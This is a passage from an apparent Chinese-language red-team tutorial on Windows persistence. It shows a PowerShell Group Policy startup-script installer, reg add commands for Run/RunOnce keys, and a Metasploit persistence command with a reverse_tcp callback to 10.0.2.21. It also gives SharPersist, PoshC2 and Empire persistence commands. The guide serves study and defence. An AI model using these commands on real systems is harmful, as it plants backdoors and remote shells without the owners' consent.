</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$regPath2</span> = <span style="color:#a6be9d">&#34;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup\0&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 确保路径存在</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">if</span> (<span style="color:#ff636f">-Not</span> (<span style="color:#58a1dd">Test-Path</span> <span style="color:#58a1dd">$regPath1</span>)) {
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">New-Item</span> <span style="color:#58a1dd">-Path</span> <span style="color:#a6be9d">&#34;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\State\Machine\Scripts&#34;</span> <span style="color:#58a1dd">-Name</span> <span style="color:#a6be9d">&#34;Startup&#34;</span> <span style="color:#58a1dd">-Force</span>
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">New-Item</span> <span style="color:#58a1dd">-Path</span> <span style="color:#a6be9d">&#34;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\State\Machine\Scripts\Startup&#34;</span> <span style="color:#58a1dd">-Name</span> <span style="color:#a6be9d">&#34;0&#34;</span> <span style="color:#58a1dd">-Force</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">if</span> (<span style="color:#ff636f">-Not</span> (<span style="color:#58a1dd">Test-Path</span> <span style="color:#a6be9d">&#34;</span><span style="color:#58a1dd">$regPath1</span><span style="color:#a6be9d">\0&#34;</span>)) {
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">New-Item</span> <span style="color:#58a1dd">-Path</span> <span style="color:#58a1dd">$regPath1</span> <span style="color:#58a1dd">-Name</span> <span style="color:#a6be9d">&#34;0&#34;</span> <span style="color:#58a1dd">-Force</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">if</span> (<span style="color:#ff636f">-Not</span> (<span style="color:#58a1dd">Test-Path</span> <span style="color:#58a1dd">$regPath2</span>)) {
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">New-Item</span> <span style="color:#58a1dd">-Path</span> <span style="color:#a6be9d">&#34;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\Scripts&#34;</span> <span style="color:#58a1dd">-Name</span> <span style="color:#a6be9d">&#34;Startup&#34;</span> <span style="color:#58a1dd">-Force</span>
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">New-Item</span> <span style="color:#58a1dd">-Path</span> <span style="color:#a6be9d">&#34;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup&#34;</span> <span style="color:#58a1dd">-Name</span> <span style="color:#a6be9d">&#34;0&#34;</span> <span style="color:#58a1dd">-Force</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">if</span> (<span style="color:#ff636f">-Not</span> (<span style="color:#58a1dd">Test-Path</span> <span style="color:#a6be9d">&#34;</span><span style="color:#58a1dd">$regPath2</span><span style="color:#a6be9d">\0&#34;</span>)) {
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">New-Item</span> <span style="color:#58a1dd">-Path</span> <span style="color:#58a1dd">$regPath2</span> <span style="color:#58a1dd">-Name</span> <span style="color:#a6be9d">&#34;0&#34;</span> <span style="color:#58a1dd">-Force</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 设置注册表项</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$commonProps</span> = <span style="color:#58a1dd">@</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#a6be9d">&#34;GPO-ID&#34;</span>      = <span style="color:#a6be9d">&#34;LocalGPO&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6be9d">&#34;SOM-ID&#34;</span>      = <span style="color:#a6be9d">&#34;Local&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6be9d">&#34;FileSysPath&#34;</span> = <span style="color:#a6be9d">&#34;C:\\Windows\\System32\\GroupPolicy\\Machine&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6be9d">&#34;DisplayName&#34;</span> = <span style="color:#a6be9d">&#34;Local Group Policy&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6be9d">&#34;GPOName&#34;</span>     = <span style="color:#a6be9d">&#34;Local Group Policy&#34;</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">foreach</span> (<span style="color:#58a1dd">$name</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">$commonProps</span>.<span style="color:#58a1dd">Keys</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">Set-ItemProperty</span> <span style="color:#58a1dd">-Path</span> <span style="color:#58a1dd">$regPath1</span> <span style="color:#58a1dd">-Name</span> <span style="color:#58a1dd">$name</span> <span style="color:#58a1dd">-Value</span> <span style="color:#58a1dd">$commonProps</span>[<span style="color:#58a1dd">$name</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">Set-ItemProperty</span> <span style="color:#58a1dd">-Path</span> <span style="color:#58a1dd">$regPath2</span> <span style="color:#58a1dd">-Name</span> <span style="color:#58a1dd">$name</span> <span style="color:#58a1dd">-Value</span> <span style="color:#58a1dd">$commonProps</span>[<span style="color:#58a1dd">$name</span>]
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 设置脚本路径和参数</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">Set-ItemProperty</span> <span style="color:#58a1dd">-Path</span> <span style="color:#a6be9d">&#34;</span><span style="color:#58a1dd">$regPath1</span><span style="color:#a6be9d">\0&#34;</span> <span style="color:#58a1dd">-Name</span> <span style="color:#a6be9d">&#34;Script&#34;</span> <span style="color:#58a1dd">-Value</span> <span style="color:#58a1dd">$scriptPath</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">Set-ItemProperty</span> <span style="color:#58a1dd">-Path</span> <span style="color:#a6be9d">&#34;</span><span style="color:#58a1dd">$regPath1</span><span style="color:#a6be9d">\0&#34;</span> <span style="color:#58a1dd">-Name</span> <span style="color:#a6be9d">&#34;Parameters&#34;</span> <span style="color:#58a1dd">-Value</span> <span style="color:#a6be9d">&#34;&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">Set-ItemProperty</span> <span style="color:#58a1dd">-Path</span> <span style="color:#a6be9d">&#34;</span><span style="color:#58a1dd">$regPath1</span><span style="color:#a6be9d">\0&#34;</span> <span style="color:#58a1dd">-Name</span> <span style="color:#a6be9d">&#34;ExecTime&#34;</span> <span style="color:#58a1dd">-Value</span> ([<span style="color:#58a1dd">byte[]</span>](<span style="color:#a6be9d">0</span>,<span style="color:#a6be9d">0</span>,<span style="color:#a6be9d">0</span>,<span style="color:#a6be9d">0</span>,<span style="color:#a6be9d">0</span>,<span style="color:#a6be9d">0</span>,<span style="color:#a6be9d">0</span>,<span style="color:#a6be9d">0</span>,<span style="color:#a6be9d">0</span>,<span style="color:#a6be9d">0</span>,<span style="color:#a6be9d">0</span>,<span style="color:#a6be9d">0</span>,<span style="color:#a6be9d">0</span>,<span style="color:#a6be9d">0</span>,<span style="color:#a6be9d">0</span>,<span style="color:#a6be9d">0</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">Set-ItemProperty</span> <span style="color:#58a1dd">-Path</span> <span style="color:#a6be9d">&#34;</span><span style="color:#58a1dd">$regPath2</span><span style="color:#a6be9d">\0&#34;</span> <span style="color:#58a1dd">-Name</span> <span style="color:#a6be9d">&#34;Script&#34;</span> <span style="color:#58a1dd">-Value</span> <span style="color:#58a1dd">$scriptPath</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">Set-ItemProperty</span> <span style="color:#58a1dd">-Path</span> <span style="color:#a6be9d">&#34;</span><span style="color:#58a1dd">$regPath2</span><span style="color:#a6be9d">\0&#34;</span> <span style="color:#58a1dd">-Name</span> <span style="color:#a6be9d">&#34;Parameters&#34;</span> <span style="color:#58a1dd">-Value</span> <span style="color:#a6be9d">&#34;&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">Set-ItemProperty</span> <span style="color:#58a1dd">-Path</span> <span style="color:#a6be9d">&#34;</span><span style="color:#58a1dd">$regPath2</span><span style="color:#a6be9d">\0&#34;</span> <span style="color:#58a1dd">-Name</span> <span style="color:#a6be9d">&#34;IsPowershell&#34;</span> <span style="color:#58a1dd">-Value</span> <span style="color:#a6be9d">0</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">Set-ItemProperty</span> <span style="color:#58a1dd">-Path</span> <span style="color:#a6be9d">&#34;</span><span style="color:#58a1dd">$regPath2</span><span style="color:#a6be9d">\0&#34;</span> <span style="color:#58a1dd">-Name</span> <span style="color:#a6be9d">&#34;ExecTime&#34;</span> <span style="color:#58a1dd">-Value</span> ([<span style="color:#58a1dd">byte[]</span>](<span style="color:#a6be9d">0</span>,<span style="color:#a6be9d">0</span>,<span style="color:#a6be9d">0</span>,<span style="color:#a6be9d">0</span>,<span style="color:#a6be9d">0</span>,<span style="color:#a6be9d">0</span>,<span style="color:#a6be9d">0</span>,<span style="color:#a6be9d">0</span>,<span style="color:#a6be9d">0</span>,<span style="color:#a6be9d">0</span>,<span style="color:#a6be9d">0</span>,<span style="color:#a6be9d">0</span>,<span style="color:#a6be9d">0</span>,<span style="color:#a6be9d">0</span>,<span style="color:#a6be9d">0</span>,<span style="color:#a6be9d">0</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">Write-Host</span> <span style="color:#a6be9d">&#34;Startup script added successfully.&#34;</span></span></span></code></pre></div><p>使用</p>
<pre tabindex="0"><code>.\add-startup-script.ps1 -scriptPath &#34;C:\path\to\your\startup-script.bat&#34;</code></pre><p>比较奇怪的是我的虚拟机好像不管用，直接在系统里添加里也没用，有点奇怪</p>
<h2 id="启动项注册表后门" class="heading-element"><span>启动项注册表后门</span>
  <a href="#%e5%90%af%e5%8a%a8%e9%a1%b9%e6%b3%a8%e5%86%8c%e8%a1%a8%e5%90%8e%e9%97%a8" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><h3 id="命令行" class="heading-element"><span>命令行</span>
  <a href="#%e5%91%bd%e4%bb%a4%e8%a1%8c" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>注册表项可以从终端添加到运行键以实现持久性。这些键将包含对==用户登录时将执行的实际负载==的引用，已知使用此持久性方法的威胁因素和红队使用以下注册表位置。</p>
<pre tabindex="0"><code>reg add &#34;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run&#34; /v Pentestlab /t REG_SZ /d &#34;C:\Users\pentestlab\pentestlab.exe&#34;
reg add &#34;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce&#34; /v Pentestlab /t REG_SZ /d &#34;C:\Users\pentestlab\pentestlab.exe&#34;
reg add &#34;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices&#34; /v Pentestlab /t REG_SZ /d &#34;C:\Users\pentestlab\pentestlab.exe&#34;
reg add &#34;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce&#34; /v Pentestlab /t REG_SZ /d &#34;C:\Users\pentestlab\pentestlab.exe&#34;</code></pre><p>值得注意的是，<code>HKEY_CURRENT_USER</code>的改动不需要管理员权限，而更改<code>HKEY_LOCAL_MACHINE</code>却是需要管理员权限</p>
<p><strong>如果已获得提升的凭据，则最好使用本地计算机注册表位置，而不是当前用户，因为payload将在每次系统启动时执行，而与使用系统身份验证的用户无关。</strong></p>
<pre tabindex="0"><code>reg add &#34;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&#34; /v Pentestlab /t REG_SZ /d &#34;C:\tmp\pentestlab.exe&#34;
reg add &#34;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce&#34; /v Pentestlab /t REG_SZ /d &#34;C:\tmp\pentestlab.exe&#34;
reg add &#34;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices&#34; /v Pentestlab /t REG_SZ /d &#34;C:\tmp\pentestlab.exe&#34;
reg add &#34;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce&#34; /v Pentestlab /t REG_SZ /d &#34;C:\tmp\pentestlab.exe&#34;</code></pre><p>另外两个注册表位置，这些位置可以允许红队通过执行任意payload或DLL来实现持久性。这些将在登录期间执行，并且需要管理员级别的特权。</p>
<pre tabindex="0"><code>reg add &#34;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001&#34; /v Pentestlab /t REG_SZ /d &#34;C:\tmp\pentestlab.exe&#34;
reg add &#34;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend&#34; /v Pentestlab /t REG_SZ /d &#34;C:\tmp\pentestlab.dll&#34;</code></pre><h3 id="metasploit" class="heading-element"><span>Metasploit</span>
  <a href="#metasploit" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>Metasploit Framework通过使用Meterpreter脚本和后期利用模块来支持通过注册表的持久性。Meterpreter脚本将==以VBS脚本的形式创建一个payload，该负载将被拖放到磁盘上，并将创建一个注册表项，该注册表项将在用户登录期间运行该payload==。</p>
<pre tabindex="0"><code>run persistence -U -P windows/x64/meterpreter/reverse_tcp -i 5 -p 443 -r 10.0.2.21</code></pre><p>另外，还有一个后期开发模块，可用于持久性。该模块需要以下配置，并将可执行文件放置在受感染系统上的可写位置。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>use post/windows/manage/persistence_exe
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">set</span> REXEPATH /tmp/pentestlab.exe
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">set</span> SESSION <span style="color:#a6be9d">2</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">set</span> STARTUP USER
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">set</span> LOCALEXEPATH C:<span style="color:#a6be9d">\\</span>tmp
</span></span><span style="display:flex;"><span>run</span></span></code></pre></div><p>由于已选择<strong>USER</strong>作为选项，该模块将使用当前用户的注册表位置。</p>
<p>如果已获得系统级别的特权，则可以将该模块配置为在<strong>HKLM</strong>位置中创建注册表项。该<strong>STARTUP</strong>选项将需要改变系统。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#58a1dd">set</span> STARTUP SYSTEM</span></span></code></pre></div><h3 id="sharpersist" class="heading-element"><span>SharPersist</span>
  <a href="#sharpersist" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p><a href="https://github.com/fireeye/SharPersist"target="_blank" rel="external nofollow noopener noreferrer">SharPersist</a>是<a href="https://twitter.com/h4wkst3r"target="_blank" rel="external nofollow noopener noreferrer">Brett Hawkins</a>在C＃中开发的工具，它结合了多种持久性技术，包括添加注册表运行键。该工具包可以加载到支持反射加载的各种命令和控制框架中，例如Cobalt Strike和PoshC2。以下命令将创建一个注册表项，该注册表项将从与Metasploit Framework模块相同的注册表位置执行任意payload。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#58a1dd">SharPersist</span> <span style="color:#58a1dd">-t</span> <span style="color:#58a1dd">reg</span> <span style="color:#58a1dd">-c</span> <span style="color:#a6be9d">&#34;C:\Windows\System32\cmd.exe&#34;</span> <span style="color:#58a1dd">-a</span> <span style="color:#a6be9d">&#34;/c C:\tmp\pentestlab.exe&#34;</span> <span style="color:#58a1dd">-k</span> <span style="color:#a6be9d">&#34;hkcurun&#34;</span> <span style="color:#58a1dd">-v</span> <span style="color:#a6be9d">&#34;pentestlab&#34;</span> <span style="color:#58a1dd">-m</span> <span style="color:#58a1dd">add</span></span></span></code></pre></div><p>如果已获得提升的访问权限，请修改命令以在本地计算机位置中安装注册表项，以实现所有用户的持久性。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#58a1dd">SharPersist</span> <span style="color:#58a1dd">-t</span> <span style="color:#58a1dd">reg</span> <span style="color:#58a1dd">-c</span> <span style="color:#a6be9d">&#34;C:\Windows\System32\cmd.exe&#34;</span> <span style="color:#58a1dd">-a</span> <span style="color:#a6be9d">&#34;/c C:\tmp\pentestlab.exe&#34;</span> <span style="color:#58a1dd">-k</span> <span style="color:#a6be9d">&#34;hklmrun&#34;</span> <span style="color:#58a1dd">-v</span> <span style="color:#a6be9d">&#34;pentestlab&#34;</span> <span style="color:#58a1dd">-m</span> <span style="color:#58a1dd">add</span> <span style="color:#58a1dd">-o</span> <span style="color:#58a1dd">env</span></span></span></code></pre></div><p>SharPersist还通过<strong>RunOnce</strong>和<strong>RunOnceEx</strong>注册表项包含持久性功能。以下命令将在这些位置创建注册表项，这些注册表项将执行任意payload。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#58a1dd">SharPersist</span> <span style="color:#58a1dd">-t</span> <span style="color:#58a1dd">reg</span> <span style="color:#58a1dd">-c</span> <span style="color:#a6be9d">&#34;C:\Windows\System32\cmd.exe&#34;</span> <span style="color:#58a1dd">-a</span> <span style="color:#a6be9d">&#34;/c pentestlab.exe&#34;</span> <span style="color:#58a1dd">-k</span> <span style="color:#a6be9d">&#34;hklmrunonce&#34;</span> <span style="color:#58a1dd">-v</span> <span style="color:#a6be9d">&#34;Pentestlab&#34;</span> <span style="color:#58a1dd">-m</span> <span style="color:#58a1dd">add</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">SharPersist</span> <span style="color:#58a1dd">-t</span> <span style="color:#58a1dd">reg</span> <span style="color:#58a1dd">-c</span> <span style="color:#a6be9d">&#34;C:\Windows\System32\cmd.exe&#34;</span> <span style="color:#58a1dd">-a</span> <span style="color:#a6be9d">&#34;/c pentestlab.exe&#34;</span> <span style="color:#58a1dd">-k</span> <span style="color:#a6be9d">&#34;hklmrunonceex&#34;</span> <span style="color:#58a1dd">-v</span> <span style="color:#a6be9d">&#34;Pentestlab&#34;</span> <span style="color:#58a1dd">-m</span> <span style="color:#58a1dd">add</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">SharPersist</span> <span style="color:#58a1dd">-t</span> <span style="color:#58a1dd">reg</span> <span style="color:#58a1dd">-c</span> <span style="color:#a6be9d">&#34;C:\Windows\System32\cmd.exe&#34;</span> <span style="color:#58a1dd">-a</span> <span style="color:#a6be9d">&#34;/c pentestlab.exe&#34;</span> <span style="color:#58a1dd">-k</span> <span style="color:#a6be9d">&#34;hkcurunonce&#34;</span> <span style="color:#58a1dd">-v</span> <span style="color:#a6be9d">&#34;Pentestlab&#34;</span> <span style="color:#58a1dd">-m</span> <span style="color:#58a1dd">add</span></span></span></code></pre></div><p>SharPersist还提供了使用另一个注册表位置进行持久化的选项（<strong>UserInitMprLogonScript</strong>）。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#58a1dd">SharPersist</span> <span style="color:#58a1dd">-t</span> <span style="color:#58a1dd">reg</span> <span style="color:#58a1dd">-c</span> <span style="color:#a6be9d">&#34;C:\Windows\System32\cmd.exe&#34;</span> <span style="color:#58a1dd">-a</span> <span style="color:#a6be9d">&#34;/c pentestlab.exe&#34;</span> <span style="color:#58a1dd">-k</span> <span style="color:#a6be9d">&#34;logonscript&#34;</span> <span style="color:#58a1dd">-m</span> <span style="color:#58a1dd">add</span></span></span></code></pre></div><h3 id="poshc2" class="heading-element"><span>PoshC2</span>
  <a href="#poshc2" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>PoshC2支持各种持久性功能，包括注册表运行键的方法。以下命令将在目标主机中创建两个注册表项。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#58a1dd">install-persistence</span></span></span></code></pre></div><p>注册表的“运行”项将具有IEUpdate的名称，以便看起来合法，第二个注册表项将作为墙纸隐藏在注册表中。</p>
<h3 id="empire" class="heading-element"><span>Empire</span>
  <a href="#empire" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>如果将Empire用作命令和控件，Empire包含两个与通过注册表运行项与持久性技术对齐的模块。根据特权级别，这些模块将尝试在以下注册表位置中安装base64payload：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#58a1dd">HKCU</span>:<span style="color:#58a1dd">SOFTWARE</span>\<span style="color:#58a1dd">Microsoft</span>\<span style="color:#58a1dd">Windows</span>\<span style="color:#58a1dd">CurrentVersion</span>\<span style="color:#58a1dd">Debug</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">HKLM</span>:<span style="color:#58a1dd">SOFTWARE</span>\<span style="color:#58a1dd">Microsoft</span>\<span style="color:#58a1dd">Windows</span>\<span style="color:#58a1dd">CurrentVersion</span>\<span style="color:#58a1dd">Debug</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#58a1dd">usemodule</span> <span style="color:#58a1dd">persistence</span>/<span style="color:#58a1dd">userland</span>/<span style="color:#58a1dd">registry</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">usemodule</span> <span style="color:#58a1dd">persistence</span>/<span style="color:#58a1dd">elevated</span>/<span style="color:#58a1dd">registry</span>*</span></span></code></pre></div><p>将在名称<strong>Updater</strong>下创建另一个注册表项，该注册表项将包含要执行的命令。PowerShell将尝试在下次登录时运行<strong>Debug</strong>密钥中存储的payload，以实现持久性。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#58a1dd">HKCU</span>:<span style="color:#58a1dd">SOFTWARE</span>\<span style="color:#58a1dd">Microsoft</span>\<span style="color:#58a1dd">Windows</span>\<span style="color:#58a1dd">CurrentVersion</span>\<span style="color:#58a1dd">Run</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">HKLM</span>:<span style="color:#58a1dd">SOFTWARE</span>\<span style="color:#58a1dd">Microsoft</span>\<span style="color:#58a1dd">Windows</span>\<span style="color:#58a1dd">CurrentVersion</span>\<span style="color:#58a1dd">Run</span></span></span></code></pre></div><h3 id="实验-2" class="heading-element"><span>实验</span>
  <a href="#%e5%ae%9e%e9%aa%8c-2" class="heading-mark">
